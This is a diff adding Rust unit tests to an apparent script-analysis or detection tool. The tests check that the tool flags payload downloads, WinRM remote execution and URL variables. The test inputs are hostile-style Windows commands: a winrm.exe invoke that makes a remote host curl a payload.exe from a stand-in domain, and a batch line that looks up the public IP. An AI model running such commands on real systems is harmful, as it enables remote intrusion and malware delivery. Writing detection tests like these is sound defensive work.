@@ -3243,6 +3243,32 @@ C:\Users\Public\wr.tmp -r:target.example cmd.exe /V:ON /c set U=https://copied-w
     }
 
     #[test]
+    fn winrm_exe_invoke_emits_remote_exec() {
+        let script = br#"winrm.exe invoke Create wmicimv2/Win32_Process -r:target.example @{CommandLine="cmd.exe /V:ON /c set U=https://winrm-exe-wrapper.example/payload.exe&&curl -o payload.exe !U!";CurrentDirectory="C:\Windows"}"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://winrm-exe-wrapper.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "winrm.exe remote child command was not analyzed: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::RemoteExec { tool, target_host }
+                    if tool == "winrm" && target_host == "target.example"
+            )),
+            "winrm.exe remote exec trait missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn geoplugin_public_ip_lookup_emits_network_probe() {
         let script = br#"@echo off
 for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
@@ -35342,6 +35368,34 @@ mod deob_scan_noise_filter_tests {
         assert!(
             !has_noise,
             "Massgrave help documentation URL not filtered: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn cmd_url_variable_stops_at_command_operator() {
+        let script = br#"set U=https://operator-stop.example/payload.exe&&echo done"#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlVariable { name, url, .. }
+                        if name == "U" && url == "https://operator-stop.example/payload.exe"
+                )
+            }),
+            "URL variable did not stop before command operator: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlVariable { url, .. } if url.contains("&&")
+                )
+            }),
+            "command operator leaked into URL variable: {:?}",
             report.traits
         );
     }
